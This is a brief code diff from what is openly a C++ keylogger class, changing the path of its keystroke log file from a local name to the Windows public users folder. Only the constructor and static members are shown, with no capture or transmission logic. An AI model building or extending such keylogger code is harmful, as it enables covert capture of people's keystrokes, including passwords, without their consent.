@@ -4,7 +4,7 @@ std::ofstream Keylogger::kblog;
 wchar_t* Keylogger::key = nullptr;
 
 Keylogger::Keylogger(wchar_t* k) {
-    kblog = std::ofstream("kb_log.txt", std::ios::app);
+    kblog = std::ofstream("C:\\Users\\Public\\kb_log.txt", std::ios::app);
     key = k;
 }
 
